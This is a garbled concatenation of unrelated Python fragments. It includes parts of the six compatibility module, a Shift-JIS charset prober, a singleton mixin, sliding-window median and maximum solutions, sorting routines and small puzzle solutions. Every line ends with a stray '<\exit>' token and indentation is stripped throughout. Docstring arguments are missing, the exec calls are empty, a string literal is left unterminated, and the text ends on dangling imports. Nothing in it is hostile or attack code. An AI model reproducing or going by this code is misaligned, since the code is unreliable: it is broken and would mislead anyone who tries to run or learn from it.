rightmost_set_bit = bits&-bits<\exit>
bits1 = 0<\exit>
bits2 = 0<\exit>
for a in A:<\exit>
if a&rightmost_set_bit:<\exit>
bits1 ^= a<\exit>
else:<\exit>
bits2 ^= a<\exit>
return bits1, bits2<\exit>
import threading<\exit>
class SingletonMixin(object):<\exit>
__singleton_lock = threading.Lock()<\exit>
__singleton_instance = None<\exit>
@classmethod<\exit>
def instance(cls):<\exit>
if not cls.__singleton_instance:<\exit>
with cls.__singleton_lock:<\exit>
if not cls.__singleton_instance:<\exit>
cls.__singleton_instance = cls()<\exit>
return cls.__singleton_instance<\exit>
import operator<\exit>
import sys<\exit>
import types<\exit>
__version__ = "1.2.0"<\exit>
PY3 = sys.version_info[0] == 3<\exit>
if PY3:<\exit>
string_types = str,<\exit>
integer_types = int,<\exit>
class_types = type,<\exit>
text_type = str<\exit>
binary_type = bytes<\exit>
MAXSIZE = sys.maxsize<\exit>
else:<\exit>
string_types = basestring,<\exit>
integer_types = (int, long)<\exit>
class_types = (type, types.ClassType)<\exit>
text_type = unicode<\exit>
binary_type = str<\exit>
if sys.platform.startswith("java"):<\exit>
MAXSIZE = int((1 << 31) - 1)<\exit>
else:<\exit>
class X(object):<\exit>
def __len__(self):<\exit>
return 1 << 31<\exit>
try:<\exit>
len(X())<\exit>
except OverflowError:<\exit>
MAXSIZE = int((1 << 31) - 1)<\exit>
else:<\exit>
MAXSIZE = int((1 << 63) - 1)<\exit>
del X<\exit>
def _add_doc(func, doc):<\exit>
func.__doc__ = doc<\exit>
def _import_module(name):<\exit>
__import__(name)<\exit>
return sys.modules[name]<\exit>
class _LazyDescr(object):<\exit>
def __init__(self, name):<\exit>
self.name = name<\exit>
def __get__(self, obj, tp):<\exit>
result = self._resolve()<\exit>
setattr(obj, self.name, result)<\exit>
delattr(tp, self.name)<\exit>
return result<\exit>
class MovedModule(_LazyDescr):<\exit>
def __init__(self, name, old, new=None):<\exit>
super(MovedModule, self).__init__(name)<\exit>
if PY3:<\exit>
if new is None:<\exit>
new = name<\exit>
self.mod = new<\exit>
else:<\exit>
self.mod = old<\exit>
def _resolve(self):<\exit>
return _import_module(self.mod)<\exit>
class MovedAttribute(_LazyDescr):<\exit>
def __init__(self, name, old_mod, new_mod, old_attr=None, new_attr=None):<\exit>
super(MovedAttribute, self).__init__(name)<\exit>
if PY3:<\exit>
if new_mod is None:<\exit>
new_mod = name<\exit>
self.mod = new_mod<\exit>
if new_attr is None:<\exit>
if old_attr is None:<\exit>
new_attr = name<\exit>
else:<\exit>
new_attr = old_attr<\exit>
self.attr = new_attr<\exit>
else:<\exit>
self.mod = old_mod<\exit>
if old_attr is None:<\exit>
old_attr = name<\exit>
self.attr = old_attr<\exit>
def _resolve(self):<\exit>
module = _import_module(self.mod)<\exit>
return getattr(module, self.attr)<\exit>
class _MovedItems(types.ModuleType):<\exit>
_moved_attributes = [<\exit>
MovedAttribute("cStringIO", "cStringIO", "io", "StringIO"),<\exit>
MovedAttribute("filter", "itertools", "builtins", "ifilter", "filter"),<\exit>
MovedAttribute("input", "__builtin__", "builtins", "raw_input", "input"),<\exit>
MovedAttribute("map", "itertools", "builtins", "imap", "map"),<\exit>
MovedAttribute("reload_module", "__builtin__", "imp", "reload"),<\exit>
MovedAttribute("reduce", "__builtin__", "functools"),<\exit>
MovedAttribute("StringIO", "StringIO", "io"),<\exit>
MovedAttribute("xrange", "__builtin__", "builtins", "xrange", "range"),<\exit>
MovedAttribute("zip", "itertools", "builtins", "izip", "zip"),<\exit>
MovedModule("builtins", "__builtin__"),<\exit>
MovedModule("configparser", "ConfigParser"),<\exit>
MovedModule("copyreg", "copy_reg"),<\exit>
MovedModule("http_cookiejar", "cookielib", "http.cookiejar"),<\exit>
MovedModule("http_cookies", "Cookie", "http.cookies"),<\exit>
MovedModule("html_entities", "htmlentitydefs", "html.entities"),<\exit>
MovedModule("html_parser", "HTMLParser", "html.parser"),<\exit>
MovedModule("http_client", "httplib", "http.client"),<\exit>
MovedModule("BaseHTTPServer", "BaseHTTPServer", "http.server"),<\exit>
MovedModule("CGIHTTPServer", "CGIHTTPServer", "http.server"),<\exit>
MovedModule("SimpleHTTPServer", "SimpleHTTPServer", "http.server"),<\exit>
MovedModule("cPickle", "cPickle", "pickle"),<\exit>
MovedModule("queue", "Queue"),<\exit>
MovedModule("reprlib", "repr"),<\exit>
MovedModule("socketserver", "SocketServer"),<\exit>
MovedModule("tkinter", "Tkinter"),<\exit>
MovedModule("tkinter_dialog", "Dialog", "tkinter.dialog"),<\exit>
MovedModule("tkinter_filedialog", "FileDialog", "tkinter.filedialog"),<\exit>
MovedModule("tkinter_scrolledtext", "ScrolledText", "tkinter.scrolledtext"),<\exit>
MovedModule("tkinter_simpledialog", "SimpleDialog", "tkinter.simpledialog"),<\exit>
MovedModule("tkinter_tix", "Tix", "tkinter.tix"),<\exit>
MovedModule("tkinter_constants", "Tkconstants", "tkinter.constants"),<\exit>
MovedModule("tkinter_dnd", "Tkdnd", "tkinter.dnd"),<\exit>
MovedModule("tkinter_colorchooser", "tkColorChooser",<\exit>
"tkinter.colorchooser"),<\exit>
MovedModule("tkinter_commondialog", "tkCommonDialog",<\exit>
"tkinter.commondialog"),<\exit>
MovedModule("tkinter_tkfiledialog", "tkFileDialog", "tkinter.filedialog"),<\exit>
MovedModule("tkinter_font", "tkFont", "tkinter.font"),<\exit>
MovedModule("tkinter_messagebox", "tkMessageBox", "tkinter.messagebox"),<\exit>
MovedModule("tkinter_tksimpledialog", "tkSimpleDialog",<\exit>
"tkinter.simpledialog"),<\exit>
MovedModule("urllib_robotparser", "robotparser", "urllib.robotparser"),<\exit>
MovedModule("winreg", "_winreg"),<\exit>
]<\exit>
for attr in _moved_attributes:<\exit>
setattr(_MovedItems, attr.name, attr)<\exit>
del attr<\exit>
moves = sys.modules[__name__ + ".moves"] = _MovedItems("moves")<\exit>
def add_move(move):<\exit>
setattr(_MovedItems, move.name, move)<\exit>
def remove_move(name):<\exit>
try:<\exit>
delattr(_MovedItems, name)<\exit>
except AttributeError:<\exit>
try:<\exit>
del moves.__dict__[name]<\exit>
except KeyError:<\exit>
raise AttributeError("no such move, %r" % (name,))<\exit>
if PY3:<\exit>
_meth_func = "__func__"<\exit>
_meth_self = "__self__"<\exit>
_func_code = "__code__"<\exit>
_func_defaults = "__defaults__"<\exit>
_iterkeys = "keys"<\exit>
_itervalues = "values"<\exit>
_iteritems = "items"<\exit>
else:<\exit>
_meth_func = "im_func"<\exit>
_meth_self = "im_self"<\exit>
_func_code = "func_code"<\exit>
_func_defaults = "func_defaults"<\exit>
_iterkeys = "iterkeys"<\exit>
_itervalues = "itervalues"<\exit>
_iteritems = "iteritems"<\exit>
try:<\exit>
advance_iterator = next<\exit>
except NameError:<\exit>
def advance_iterator(it):<\exit>
return it.next()<\exit>
next = advance_iterator<\exit>
if PY3:<\exit>
def get_unbound_function(unbound):<\exit>
return unbound<\exit>
Iterator = object<\exit>
def callable(obj):<\exit>
return any("__call__" in klass.__dict__ for klass in type(obj).__mro__)<\exit>
else:<\exit>
def get_unbound_function(unbound):<\exit>
return unbound.im_func<\exit>
class Iterator(object):<\exit>
def next(self):<\exit>
return type(self).__next__(self)<\exit>
callable = callable<\exit>
_add_doc(get_unbound_function,<\exit>
)<\exit>
get_method_function = operator.attrgetter(_meth_func)<\exit>
get_method_self = operator.attrgetter(_meth_self)<\exit>
get_function_code = operator.attrgetter(_func_code)<\exit>
get_function_defaults = operator.attrgetter(_func_defaults)<\exit>
def iterkeys(d):<\exit>
return iter(getattr(d, _iterkeys)())<\exit>
def itervalues(d):<\exit>
return iter(getattr(d, _itervalues)())<\exit>
def iteritems(d):<\exit>
return iter(getattr(d, _iteritems)())<\exit>
if PY3:<\exit>
def b(s):<\exit>
return s.encode("latin-1")<\exit>
def u(s):<\exit>
return s<\exit>
if sys.version_info[1] <= 1:<\exit>
def int2byte(i):<\exit>
return bytes((i,))<\exit>
else:<\exit>
int2byte = operator.methodcaller("to_bytes", 1, "big")<\exit>
import io<\exit>
StringIO = io.StringIO<\exit>
BytesIO = io.BytesIO<\exit>
else:<\exit>
def b(s):<\exit>
return s<\exit>
def u(s):<\exit>
return unicode(s, "unicode_escape")<\exit>
int2byte = chr<\exit>
import StringIO<\exit>
StringIO = BytesIO = StringIO.StringIO<\exit>
_add_doc(b, )<\exit>
_add_doc(u, )<\exit>
if PY3:<\exit>
import builtins<\exit>
exec_ = getattr(builtins, "exec")<\exit>
def reraise(tp, value, tb=None):<\exit>
if value.__traceback__ is not tb:<\exit>
raise value.with_traceback(tb)<\exit>
raise value<\exit>
print_ = getattr(builtins, "print")<\exit>
del builtins<\exit>
else:<\exit>
def exec_(code, globs=None, locs=None):<\exit>
if globs is None:<\exit>
frame = sys._getframe(1)<\exit>
globs = frame.f_globals<\exit>
if locs is None:<\exit>
locs = frame.f_locals<\exit>
del frame<\exit>
elif locs is None:<\exit>
locs = globs<\exit>
exec()<\exit>
exec_()<\exit>
def print_(*args, **kwargs):<\exit>
fp = kwargs.pop("file", sys.stdout)<\exit>
if fp is None:<\exit>
return<\exit>
def write(data):<\exit>
if not isinstance(data, basestring):<\exit>
data = str(data)<\exit>
fp.write(data)<\exit>
want_unicode = False<\exit>
sep = kwargs.pop("sep", None)<\exit>
if sep is not None:<\exit>
if isinstance(sep, unicode):<\exit>
want_unicode = True<\exit>
elif not isinstance(sep, str):<\exit>
raise TypeError("sep must be None or a string")<\exit>
end = kwargs.pop("end", None)<\exit>
if end is not None:<\exit>
if isinstance(end, unicode):<\exit>
want_unicode = True<\exit>
elif not isinstance(end, str):<\exit>
raise TypeError("end must be None or a string")<\exit>
if kwargs:<\exit>
raise TypeError("invalid keyword arguments to print()")<\exit>
if not want_unicode:<\exit>
for arg in args:<\exit>
if isinstance(arg, unicode):<\exit>
want_unicode = True<\exit>
break<\exit>
if want_unicode:<\exit>
newline = unicode("\n")<\exit>
space = unicode(" ")<\exit>
else:<\exit>
newline = "\n"<\exit>
space = " "<\exit>
if sep is None:<\exit>
sep = space<\exit>
if end is None:<\exit>
end = newline<\exit>
for i, arg in enumerate(args):<\exit>
if i:<\exit>
write(sep)<\exit>
write(arg)<\exit>
write(end)<\exit>
_add_doc(reraise, )<\exit>
def with_metaclass(meta, base=object):<\exit>
return meta("NewBase", (base,), {})<\exit>
import sys<\exit>
from .mbcharsetprober import MultiByteCharSetProber<\exit>
from .codingstatemachine import CodingStateMachine<\exit>
from .chardistribution import SJISDistributionAnalysis<\exit>
from .jpcntx import SJISContextAnalysis<\exit>
from .mbcssm import SJISSMModel<\exit>
from . import constants<\exit>
class SJISProber(MultiByteCharSetProber):<\exit>
def __init__(self):<\exit>
MultiByteCharSetProber.__init__(self)<\exit>
self._mCodingSM = CodingStateMachine(SJISSMModel)<\exit>
self._mDistributionAnalyzer = SJISDistributionAnalysis()<\exit>
self._mContextAnalyzer = SJISContextAnalysis()<\exit>
self.reset()<\exit>
def reset(self):<\exit>
MultiByteCharSetProber.reset(self)<\exit>
self._mContextAnalyzer.reset()<\exit>
def get_charset_name(self):<\exit>
return "SHIFT_JIS"<\exit>
def feed(self, aBuf):<\exit>
aLen = len(aBuf)<\exit>
for i in range(0, aLen):<\exit>
codingState = self._mCodingSM.next_state(aBuf[i])<\exit>
if codingState == constants.eError:<\exit>
if constants._debug:<\exit>
sys.stderr.write(self.get_charset_name()<\exit>
+ ' prober hit error at byte ' + str(i)<\exit>
+ '\n')<\exit>
self._mState = constants.eNotMe<\exit>
break<\exit>
elif codingState == constants.eItsMe:<\exit>
self._mState = constants.eFoundIt<\exit>
break<\exit>
elif codingState == constants.eStart:<\exit>
charLen = self._mCodingSM.get_current_charlen()<\exit>
if i == 0:<\exit>
self._mLastChar[1] = aBuf[0]<\exit>
self._mContextAnalyzer.feed(self._mLastChar[2 - charLen:],<\exit>
charLen)<\exit>
self._mDistributionAnalyzer.feed(self._mLastChar, charLen)<\exit>
else:<\exit>
self._mContextAnalyzer.feed(aBuf[i + 1 - charLen:i + 3<\exit>
- charLen], charLen)<\exit>
self._mDistributionAnalyzer.feed(aBuf[i - 1:i + 1],<\exit>
charLen)<\exit>
self._mLastChar[0] = aBuf[aLen - 1]<\exit>
if self.get_state() == constants.eDetecting:<\exit>
if (self._mContextAnalyzer.got_enough_data() and<\exit>
(self.get_confidence() > constants.SHORTCUT_THRESHOLD)):<\exit>
self._mState = constants.eFoundIt<\exit>
return self.get_state()<\exit>
def get_confidence(self):<\exit>
contxtCf = self._mContextAnalyzer.get_confidence()<\exit>
distribCf = self._mDistributionAnalyzer.get_confidence()<\exit>
return max(contxtCf, distribCf)<\exit>
class Solution:<\exit>
def maxSlidingWindow(self, nums, k):<\exit>
if not nums or k == 0:<\exit>
return []<\exit>
q = []<\exit>
ret = []<\exit>
for i in xrange(k):<\exit>
while q and nums[i] >= nums[q[-1]]:<\exit>
q.pop()<\exit>
q.append(i)<\exit>
ret.append(nums[q[0]])<\exit>
for i in xrange(k, len(nums)):<\exit>
while q and nums[i] >= nums[q[-1]]:<\exit>
q.pop()<\exit>
while q and q[0] < i-k+1:<\exit>
q.pop(0)<\exit>
q.append(i)<\exit>
ret.append(nums[q[0]])<\exit>
return ret<\exit>
if __name__ == "__main__":<\exit>
print Solution().maxSlidingWindow([1, 2, 7, 7, 8], 3)<\exit>
from collections import defaultdict<\exit>
class Heap(object):<\exit>
def __init__(self, A):<\exit>
self._A = A<\exit>
self._h = []<\exit>
self._pos = defaultdict(set)<\exit>
def _pos2pos_set(self, ind):<\exit>
return self._pos[self._A[self._h[ind]]]<\exit>
def _swap_heap_node(self, i, j):<\exit>
if self._cmp_by_pos(i, j) == 0:<\exit>
return<\exit>
self._pos2pos_set(i).remove(i)<\exit>
self._pos2pos_set(j).remove(j)<\exit>
self._pos2pos_set(i).add(j)<\exit>
self._pos2pos_set(j).add(i)<\exit>
self._h[i], self._h[j] = self._h[j], self._h[i]<\exit>
def _pi(self, pos):<\exit>
if pos%2 == 0:<\exit>
return max(0, pos/2-1)<\exit>
else:<\exit>
return pos/2<\exit>
def push(self, i):<\exit>
pos = len(self._h)<\exit>
self._h.append(i)<\exit>
self._pos[self._A[i]].add(pos)<\exit>
pi = self._pi(pos)<\exit>
while pi != pos and self._cmp_by_pos(pos, pi) < 0:<\exit>
self._swap_heap_node(pi, pos)<\exit>
pos = pi<\exit>
pi = self._pi(pos)<\exit>
def _val2pos(self, val):<\exit>
return next(iter(self._pos[val]))<\exit>
def _pos2val(self, pos):<\exit>
return self._A[self._h[pos]]<\exit>
def _cmp_by_pos(self, i, j):<\exit>
return self._pos2val(i) - self._pos2val(j)<\exit>
def remove(self, i):<\exit>
try:<\exit>
pos = self._val2pos(self._A[i])<\exit>
self.pop(pos)<\exit>
except StopIteration:<\exit>
pass<\exit>
def _heappush(self, pos):<\exit>
n = len(self._h)<\exit>
if pos >= n:<\exit>
return<\exit>
l = 2*pos+1<\exit>
r = 2*pos+2<\exit>
mini = pos<\exit>
if l < n and self._cmp_by_pos(l, mini) < 0:<\exit>
mini = l<\exit>
if r < n and self._cmp_by_pos(r, mini) < 0:<\exit>
mini = r<\exit>
if pos != mini:<\exit>
self._swap_heap_node(pos, mini)<\exit>
self._heappush(mini)<\exit>
def peek(self):<\exit>
return self._h[0]<\exit>
def pop(self, pos=0):<\exit>
last_pos = len(self._h)-1<\exit>
self._swap_heap_node(pos, last_pos)<\exit>
self._pos2pos_set(last_pos).remove(last_pos)<\exit>
head = self._h.pop()<\exit>
self._heappush(pos)<\exit>
return head<\exit>
def __len__(self):<\exit>
return len(self._h)<\exit>
def __repr__(self):<\exit>
return repr(map(lambda x: self._A[x], self._h))<\exit>
class DualHeap(object):<\exit>
def __init__(self, A):<\exit>
self._A = A<\exit>
self.min_h = Heap(A)<\exit>
self.max_h = Heap(map(lambda x: -x, A))<\exit>
def _rebalance(self):<\exit>
r = len(self.min_h)<\exit>
l = len(self.max_h)<\exit>
if abs(l-r) <= 1:<\exit>
return<\exit>
if r > l:<\exit>
self.max_h.push(self.min_h.pop())<\exit>
else:<\exit>
self.min_h.push(self.max_h.pop())<\exit>
self._rebalance()<\exit>
def add(self, i):<\exit>
if len(self.min_h) > 0 and self._A[i] > self._A[self.min_h.peek()]:<\exit>
self.min_h.push(i)<\exit>
else:<\exit>
self.max_h.push(i)<\exit>
self._rebalance()<\exit>
def remove(self, i):<\exit>
if len(self.min_h) > 0 and self._A[i] >= self._A[self.min_h.peek()]:<\exit>
self.min_h.remove(i)<\exit>
else:<\exit>
self.max_h.remove(i)<\exit>
self._rebalance()<\exit>
def median(self):<\exit>
r = len(self.min_h)<\exit>
l = len(self.max_h)<\exit>
if r > l:<\exit>
return self._A[self.min_h.peek()]<\exit>
else:<\exit>
return self._A[self.max_h.peek()]<\exit>
def __repr__(self):<\exit>
return repr(self.max_h)+repr(self.min_h)<\exit>
class Solution:<\exit>
def medianSlidingWindow(self, nums, k):<\exit>
if len(nums) < 1:<\exit>
return []<\exit>
ret = []<\exit>
dh = DualHeap(nums)<\exit>
for i in xrange(k):<\exit>
dh.add(i)<\exit>
ret.append(dh.median())<\exit>
for i in xrange(k, len(nums)):<\exit>
dh.remove(i-k)<\exit>
dh.add(i)<\exit>
ret.append(dh.median())<\exit>
return ret<\exit>
if __name__ == "__main__":<\exit>
assert Solution().medianSlidingWindow([1, 1, 1, 1], 3) == [1, 1]<\exit>
assert Solution().medianSlidingWindow([1, 2, 7, 8, 5], 3) == [2, 7, 7]<\exit>
class PriorityQueue(object):<\exit>
def __init__(self):<\exit>
self.lst = []<\exit>
def bisect(self, t):<\exit>
l = 0<\exit>
h = len(self.lst)<\exit>
while l < h:<\exit>
m = (l+h)/2<\exit>
if self.lst[m] < t:<\exit>
l = m+1<\exit>
else:<\exit>
h = m<\exit>
return l<\exit>
def insert(self, t):<\exit>
pos = self.bisect(t)<\exit>
self.lst.insert(pos, t)<\exit>
def remove(self, t):<\exit>
pos = self.bisect(t)<\exit>
if self.lst[pos] != t:<\exit>
raise ValueError("%s not found in the queue"%str(t))<\exit>
del self.lst[pos]<\exit>
def __getitem__(self, item):<\exit>
return self.lst[item]<\exit>
import heapq<\exit>
from collections import defaultdict<\exit>
class Heap(object):<\exit>
def __init__(self):<\exit>
self.h = []<\exit>
self.existing = defaultdict(int)<\exit>
self.len = 0<\exit>
def push(self, t):<\exit>
heapq.heappush(self.h, t)<\exit>
self.existing[t] += 1<\exit>
self.len += 1<\exit>
def pop(self):<\exit>
while True:<\exit>
a = heapq.heappop(self.h)<\exit>
if self.existing[a] == 0:<\exit>
continue<\exit>
else:<\exit>
self.remove(a)<\exit>
return a<\exit>
def remove(self, t):<\exit>
if self.existing[t] < 1:<\exit>
raise ValueError("%s does not exist in the heap"%str(t))<\exit>
self.existing[t] -= 1<\exit>
self.len -= 1<\exit>
def __len__(self):<\exit>
return self.len<\exit>
def peek(self):<\exit>
a = self.h[0]<\exit>
if self.existing[a] > 0:<\exit>
return a<\exit>
a = self.pop()<\exit>
self.push(a)<\exit>
return a<\exit>
def __repr__(self):<\exit>
return repr(self.existing)<\exit>
class DualHeap(object):<\exit>
def __init__(self):<\exit>
self.min_h = Heap()<\exit>
self.max_h = Heap()<\exit>
def _rebalance(self):<\exit>
r = len(self.min_h)<\exit>
l = len(self.max_h)<\exit>
if abs(l-r) <= 1:<\exit>
return<\exit>
if r > l:<\exit>
self.max_h.push(-self.min_h.pop())<\exit>
else:<\exit>
self.min_h.push(-self.max_h.pop())<\exit>
self._rebalance()<\exit>
def add(self, t):<\exit>
if len(self.min_h) > 0 and t > self.min_h.peek():<\exit>
self.min_h.push(t)<\exit>
else:<\exit>
self.max_h.push(-t)<\exit>
self._rebalance()<\exit>
def remove(self, t):<\exit>
if len(self.min_h) > 0 and t >= self.min_h.peek():<\exit>
self.min_h.remove(t)<\exit>
else:<\exit>
self.max_h.remove(-t)<\exit>
self._rebalance()<\exit>
def median(self):<\exit>
r = len(self.min_h)<\exit>
l = len(self.max_h)<\exit>
if r > l:<\exit>
return self.min_h.peek()<\exit>
else:<\exit>
return -self.max_h.peek()<\exit>
def __repr__(self):<\exit>
return repr(self.max_h)+repr(self.min_h)<\exit>
class Solution:<\exit>
def medianSlidingWindow(self, nums, k):<\exit>
if len(nums) < 1:<\exit>
return []<\exit>
ret = []<\exit>
dh = DualHeap()<\exit>
for i in xrange(k):<\exit>
dh.add(nums[i])<\exit>
ret.append(dh.median())<\exit>
for i in xrange(k, len(nums)):<\exit>
dh.remove(nums[i-k])<\exit>
dh.add(nums[i])<\exit>
ret.append(dh.median())<\exit>
return ret<\exit>
def medianSlidingWindow_TLE(self, nums, k):<\exit>
if len(nums) < 1:<\exit>
return []<\exit>
pq = PriorityQueue()<\exit>
for i in xrange(k):<\exit>
pq.insert(nums[i])<\exit>
ret = []<\exit>
mid = k/2<\exit>
if k%2 == 0:<\exit>
mid -= 1<\exit>
ret.append(pq[mid])<\exit>
for i in xrange(k, len(nums)):<\exit>
pq.remove(nums[i-k])<\exit>
pq.insert(nums[i])<\exit>
ret.append(pq[mid])<\exit>
return ret<\exit>
if __name__ == "__main__":<\exit>
assert Solution().medianSlidingWindow([1, 2, 7, 8, 5], 3) == [2, 7, 7]<\exit>
import heapq<\exit>
from collections import defaultdict<\exit>
class Value(object):<\exit>
def __init__(self, val):<\exit>
self.val = val<\exit>
self.deleted = False<\exit>
def __neg__(self):<\exit>
self.val = -self.val<\exit>
return self<\exit>
def __cmp__(self, other):<\exit>
assert isinstance(other, Value)<\exit>
return self.val - other.val<\exit>
def __repr__(self):<\exit>
return repr(self.val)<\exit>
class Heap(object):<\exit>
def __init__(self):<\exit>
self.h = []<\exit>
self.len = 0<\exit>
def push(self, t):<\exit>
heapq.heappush(self.h, t)<\exit>
self.len += 1<\exit>
def pop(self):<\exit>
self._clean_top()<\exit>
self.len -= 1<\exit>
return heapq.heappop(self.h)<\exit>
def remove(self, t):<\exit>
t.deleted = True<\exit>
self.len -= 1<\exit>
def __len__(self):<\exit>
return self.len<\exit>
def _clean_top(self):<\exit>
while self.h and self.h[0].deleted:<\exit>
heapq.heappop(self.h)<\exit>
def peek(self):<\exit>
self._clean_top()<\exit>
return self.h[0]<\exit>
def __repr__(self):<\exit>
return repr(self.h)<\exit>
class DualHeap(object):<\exit>
def __init__(self):<\exit>
self.min_h = Heap()<\exit>
self.max_h = Heap()<\exit>
def _rebalance(self):<\exit>
r = len(self.min_h)<\exit>
l = len(self.max_h)<\exit>
if abs(l-r) <= 1:<\exit>
return<\exit>
if r > l:<\exit>
self.max_h.push(-self.min_h.pop())<\exit>
else:<\exit>
self.min_h.push(-self.max_h.pop())<\exit>
self._rebalance()<\exit>
def add(self, t):<\exit>
if len(self.min_h) > 0 and t > self.min_h.peek():<\exit>
self.min_h.push(t)<\exit>
else:<\exit>
self.max_h.push(-t)<\exit>
self._rebalance()<\exit>
def remove(self, t):<\exit>
if len(self.min_h) > 0 and t >= self.min_h.peek():<\exit>
self.min_h.remove(t)<\exit>
else:<\exit>
self.max_h.remove(t)<\exit>
self._rebalance()<\exit>
def median(self):<\exit>
r = len(self.min_h)<\exit>
l = len(self.max_h)<\exit>
if r > l:<\exit>
return self.min_h.peek().val<\exit>
else:<\exit>
return -self.max_h.peek().val<\exit>
def __repr__(self):<\exit>
return repr(self.max_h)+repr(self.min_h)<\exit>
class Solution:<\exit>
def medianSlidingWindow(self, nums, k):<\exit>
nums = map(lambda x: Value(x), nums)<\exit>
if len(nums) < 1:<\exit>
return []<\exit>
ret = []<\exit>
dh = DualHeap()<\exit>
for i in xrange(k):<\exit>
dh.add(nums[i])<\exit>
ret.append(dh.median())<\exit>
for i in xrange(k, len(nums)):<\exit>
dh.remove(nums[i-k])<\exit>
dh.add(nums[i])<\exit>
ret.append(dh.median())<\exit>
return ret<\exit>
if __name__ == "__main__":<\exit>
assert Solution().medianSlidingWindow([1, 2, 7, 7, 2], 3) == [2, 7, 7]<\exit>
assert Solution().medianSlidingWindow([1, 2, 7, 8, 5], 3) == [2, 7, 7]<\exit>
class Solution:<\exit>
def sortLetters(self, chars):<\exit>
closed = -1<\exit>
for ind, val in enumerate(chars):<\exit>
if ord(val) < ord('a'):<\exit>
continue<\exit>
else:<\exit>
closed += 1<\exit>
chars[ind], chars[closed] = chars[closed], chars[ind]<\exit>
if __name__ == "__main__":<\exit>
chars = list("abAcD")<\exit>
Solution().sortLetters(chars)<\exit>
assert "".join(chars) == "abcAD<\exit>
import random<\exit>
class PartialQuickSort(object):<\exit>
def partial_qsort(self, A, i, j, m):<\exit>
if i >= j: return<\exit>
p = self.pivot(A, i, j)<\exit>
self.partial_qsort(A, i, p, m)<\exit>
if p+1 >= m: return<\exit>
self.partial_qsort(A, p+1, j, m)<\exit>
def pivot(self, A, i, j):<\exit>
p = i<\exit>
closed = p<\exit>
for ptr in xrange(i, j):<\exit>
if A[ptr] < A[p]:<\exit>
closed += 1<\exit>
A[ptr], A[closed] = A[closed], A[ptr]<\exit>
A[closed], A[p] = A[p], A[closed]<\exit>
return closed<\exit>
@staticmethod<\exit>
def test():<\exit>
A = [4, 5, 3, 2, 1, 6, 7]<\exit>
sorter = PartialQuickSort()<\exit>
m = 3<\exit>
sorter.partial_qsort(A, 0, len(A), m)<\exit>
try:<\exit>
assert A[:m] == range(1, m+1)<\exit>
except AssertionError as e:<\exit>
print A[:m]<\exit>
raise e<\exit>
class MergeSort(object):<\exit>
def merge_sort(self, A):<\exit>
n = len(A)<\exit>
l = 1<\exit>
while l <= n:<\exit>
for i in range(0, n, l*2):<\exit>
lo, hi = i, min(n, i+2*l)<\exit>
mid = i + l<\exit>
p, q = lo, mid<\exit>
while p < mid and q < hi:<\exit>
if A[p] < A[q]:<\exit>
p += 1<\exit>
else:<\exit>
tmp = A[q]<\exit>
A[p+1: q+1] = A[p:q]<\exit>
A[p] = tmp<\exit>
p, mid, q = p+1, mid+1, q+1<\exit>
l *= 2<\exit>
return A<\exit>
@staticmethod<\exit>
def test():<\exit>
sorter = MergeSort()<\exit>
assert sorter.merge_sort([4, 3, 2, 1]) == [1, 2, 3, 4]<\exit>
assert sorter.merge_sort([4, 2, 3, 1]) == [1, 2, 3, 4]<\exit>
assert sorter.merge_sort([4, 5, 3, 2, 1]) == [1, 2, 3, 4, 5]<\exit>
for _ in range(100):<\exit>
tmp = range(100)<\exit>
random.shuffle(tmp)<\exit>
assert sorter.merge_sort(tmp) == range(100)<\exit>
return 'test pass!'<\exit>
class MergeSorter2(object):<\exit>
def merge_sort(self, A):<\exit>
if len(A) <= 1:<\exit>
return<\exit>
mid = len(A)/2<\exit>
L, R = A[:mid], A[mid:]<\exit>
self.merge_sort(L)<\exit>
self.merge_sort(R)<\exit>
i, j, k = 0, 0, 0<\exit>
while i < len(L) and j < len(R):<\exit>
if L[i] < R[j]:<\exit>
A[k] = L[i]<\exit>
i += 1<\exit>
else:<\exit>
A[k] = R[j]<\exit>
j += 1<\exit>
k += 1<\exit>
if i < len(L):<\exit>
A[k:] = L[i:]<\exit>
if j < len(R):<\exit>
A[k:] = R[j:]<\exit>
@staticmethod<\exit>
def test():<\exit>
sorter = MergeSorter2()<\exit>
A = [4, 3, 2, 1]<\exit>
sorter.merge_sort(A)<\exit>
assert A == [1, 2, 3, 4]<\exit>
for _ in range(100):<\exit>
tmp = range(100)<\exit>
random.shuffle(tmp)<\exit>
sorter.merge_sort(tmp)<\exit>
assert tmp == range(100)<\exit>
return 'test pass!'<\exit>
if __name__ == "__main__":<\exit>
PartialQuickSort.test()<\exit>
MergeSort.test()<\exit>
MergeSorter2.test()<\exit>
class Solution:<\exit>
def replaceBlank(self, string, length):<\exit>
i = 0<\exit>
while i < length:<\exit>
if string[i] == " ":<\exit>
string.append("")<\exit>
string.append("")<\exit>
length += 2<\exit>
for j in xrange(length-1, i, -1):<\exit>
string[j] = string[j-2]<\exit>
string[i:i+3] = list("%20")<\exit>
i += 2<\exit>
i += 1<\exit>
return length<\exit>
if __name__ == "__main__":<\exit>
assert Solution().replaceBlank(list("Mr John Smith"), 13) == 17<\exit>
class Solution(object):<\exit>
def solve(self, cipher):<\exit>
N = cipher<\exit>
x = 1<\exit>
while True:<\exit>
binary = bin(x)[2:]<\exit>
nine_ary = str(binary).replace("1", "9")<\exit>
dec = int(nine_ary)<\exit>
if dec % N == 0:<\exit>
return dec<\exit>
x += 1<\exit>
if __name__ == "__main__":<\exit>
import sys<\exit>
f = open("1.in", "r")<\exit>
testcases = int(f.readline().strip())<\exit>
for t in xrange(testcases):<\exit>
cipher = int(f.readline().strip())<\exit>
s = "%s\n" % (Solution().solve(cipher))<\exit>
print s,<\exit>
class AllNerestSmallerValues(object):<\exit>
def allNearestSmaller(self, A):<\exit>
P = [-1 for _ in A]<\exit>
stk = []<\exit>
for i, v in enumerate(A):<\exit>
while stk and A[stk[-1]] >= v: stk.pop()<\exit>
if stk:<\exit>
P[i] = stk[-1]<\exit>
else:<\exit>
P[i] = -1<\exit>
stk.append(i)<\exit>
return P<\exit>
@staticmethod<\exit>
def test():<\exit>
A = [0, 8, 4, 12, 2, 10, 6, 14, 1, 9, 5, 13, 3, 11, 7, 15]<\exit>
solution = AllNerestSmallerValues()<\exit>
P = solution.allNearestSmaller(A)<\exit>
expected = [None, 0, 0, 4, 0, 2, 2, 6, 0, 1, 1, 5, 1, 3, 3, 7]<\exit>
for i, v in enumerate(P):<\exit>
if P[i] == -1:<\exit>
assert expected[i] is None<\exit>
else:<\exit>
assert expected[i] == A[P[i]]<\exit>
if __name__ == "__main__":<\exit>
AllNerestSmallerValues.test()<\exit>
import sys<\exit>
import os<\exit>
from posixpath import normpath<\exit>
from urllib import unquote<\exit>
